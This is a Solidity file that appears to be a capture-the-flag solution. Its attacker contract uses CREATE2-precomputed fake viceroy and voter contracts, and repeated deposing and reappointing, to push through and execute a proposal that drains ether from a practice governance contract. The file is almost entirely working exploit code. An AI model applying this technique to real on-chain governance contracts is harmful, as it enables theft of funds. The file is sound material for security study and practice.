// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "hardhat/console.sol";
import "../Viceroy.sol";

contract FakeVoter {
    Governance public target;
    address public viceroy;

    constructor(address _governance, address _viceroy) {
        // need to appoint
        target = Governance(_governance);
        viceroy = _viceroy;
    }

    function vote(uint256 proposalId) public {
        target.voteOnProposal(proposalId, true, viceroy);
    }
}

contract FakeViceroy {
    Governance public target;
    address public owner;

    constructor(address _target) {
        owner = msg.sender;
        target = Governance(_target);
        console.log("fake viceroy constructor entered, address is:", address(this));
    }

    // function approveVoters(address[] fakeVoterAddresses) public {}
    function createProposal(bytes memory proposal) public {
        target.createProposal(address(this), proposal);
    }

    function approveVoter(address fakeVoter) public {
        target.approveVoter(fakeVoter);
    }
}

contract GovernanceAttacker {
    address public owner;
    address[] public fakeVotersArray;

    constructor() {
        owner = msg.sender;
    }

    function attack(address governance) public {
        console.log("Governance Attacker attack entered");
        console.log("msg.sender", msg.sender);
        //prepare proposalData
        bytes memory proposalData = abi.encodeWithSignature("exec(address,bytes,uint256)", msg.sender, "", 10 ether);
        uint256 proposalId = uint256(keccak256(proposalData));
        Governance target = Governance(governance);
        // Step 1
        bytes memory viceroyBytecode = getByteCodeOfFakeViceroy(governance);
        address fakeViceroyAdd = getAddressOfFakeViceroy(viceroyBytecode, 1);
        console.log("fakeViceroyAdd:", fakeViceroyAdd);
        //FakeViceroy fakeViceroy1 = new FakeViceroy{salt:bytes32(uint256(1))}(governance);
        //console.log("in attack fakeViceroy1 address is :", address(fakeViceroy1));
        // Step 2 - Make 10  (5?)fake voters
        for (uint256 i = 0; i < 5; i++) {
            bytes memory bytecode = getBytecodeOfFakeVoter(governance, address(fakeViceroyAdd));
            address fakeVoterAdd = getAddressOfFakerVoter(bytecode, i);
            console.log("Loop i:", i);
            console.log("fakeVoterAdd:", fakeVoterAdd);
            fakeVotersArray.push(fakeVoterAdd);
        }
        // Step 3 - appoint Viceroy
        target.appointViceroy(fakeViceroyAdd, 1);

        // Step 4 - Deploy Viceroy
        FakeViceroy fakeViceroy1 = new FakeViceroy{salt:bytes32(uint256(1))}(governance);
        // Step 5 - Create proposal
        fakeViceroy1.createProposal(proposalData);
        // Step 6 - Appoint first 5 fake voters as viceroy
        for (uint256 i = 0; i < 5; i++) {
            address fakeVoter = fakeVotersArray[i];
            fakeViceroy1.approveVoter(fakeVoter);
            // Step 7 - Deploy 5 voters and make them vote on proposal
            FakeVoter fakeVoterContract = new FakeVoter{salt:bytes32(uint256(i))}(governance,fakeViceroyAdd);
            fakeVoterContract.vote(proposalId);
        }
        //Step 8 - depose old viceroy
        target.deposeViceroy(fakeViceroyAdd, 1);
        //fakeViceroy1.selfDestruct();
        //Step 9 Reinstate Viceroy with same address
        bytes memory viceroyBytecode2 = getByteCodeOfFakeViceroy(governance);
        address fakeViceroyAdd2 = getAddressOfFakeViceroy(viceroyBytecode2, 2);
        for (uint256 i = 5; i < 10; i++) {
            bytes memory bytecode = getBytecodeOfFakeVoter(governance, address(fakeViceroyAdd2));
            address fakeVoterAdd = getAddressOfFakerVoter(bytecode, i);
            console.log("Loop i:", i);
            console.log("fakeVoterAdd:", fakeVoterAdd);
            fakeVotersArray.push(fakeVoterAdd);
        }
        target.appointViceroy(fakeViceroyAdd2, 1);
        FakeViceroy fakeViceroy2 = new FakeViceroy{salt:bytes32(uint256(2))}(governance);
        // make 5 more fake voters

        //Step 10 - Appoint next 5 fake voters as viceroy
        for (uint256 i = 5; i < 10; i++) {
            console.log("i is:", i);
            address fakeVoter = fakeVotersArray[i];
            console.log("fakeVoter is:", fakeVoter);
            fakeViceroy2.approveVoter(fakeVoter);
            //Step 11 - Next 5 voters vote again
            FakeVoter fakeVoterContract = new FakeVoter{salt:bytes32(uint256(i))}(governance,fakeViceroyAdd2);
            console.log("fakeVoterContract is:", address(fakeVoterContract));
            fakeVoterContract.vote(proposalId);
        }
        // Step 12 - execute proposal
        target.executeProposal(proposalId);
    }

    function getByteCodeOfFakeViceroy(address governance) public pure returns (bytes memory) {
        bytes memory bytecode = type(FakeViceroy).creationCode;
        return abi.encodePacked(bytecode, abi.encode(governance));
    }

    function getAddressOfFakeViceroy(bytes memory bytecode, uint256 _salt) public view returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
        return address(uint160(uint256(hash)));
    }

    function getAddressOfFakerVoter(bytes memory bytecode, uint256 _salt)
        public
        view
        returns (address preComputedAddress)
    {
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
        preComputedAddress = address(uint160(uint256(hash)));
    }

    function getBytecodeOfFakeVoter(address _governance, address _viceroy) public pure returns (bytes memory) {
        bytes memory bytecode = type(FakeVoter).creationCode;
        return abi.encodePacked(bytecode, abi.encode(_governance, _viceroy));
    }
}

//What is our approach to this?

// We can use CREATE2 to precomute our addresses

/**
 * Problem 1: We must appoint a Viceory that is an EOA
 * Problem 1.5: Be aware that proposalID is uint256(kecceak256(proposal))
 * Problem 2: Viceroy must approve 5 voters that are EOAs
 * problem 3: Each viceroy only can approve 5 voters, we need to depose vicero, and re appoint him
 * Problem 4: Because of the alreadyVoted flag, we need to appoint 5 new voters.
 *
 *
 *
 * Voting on proposal assumes voters are EOAs,so there is no check
 *
 * Step 1: As Oligarch, precompute a FakeViceroy's address
 * Step 2: As Oligraph precompute 10 different unique FakeVoter addresses
 * Step 3: Appoint FakeViceroy's precomputed address as the Viceroy
 *    Step 4: Deploy FakeViceroy
 * Step 5: As Fake Viceroy, create a proposal
 *
 *
 * Step 6: Inside FakeViceroy's constructor, we need to appoint 5 of the FakeVoters
 * Step 7: 5 of said FakeVoters must vote on said proposal;
 * Step 8: As Oligarch, depose FakeViceroy to reset
 * Step 9: Redeploy FakeViceroy using the same precomputed address
 * Step 10: Fake Viceroy needs to appoint the next 5 FakeVoters
 * Step 11: Next 5 of said Fake voters must vote on said proposal
 * Step 12: Proposal becomes executed, data in proposal must be
 * -> abi.encodeWithSignature("exec(address,bytes,uint256)", address(owner),"",1 ether);
 */
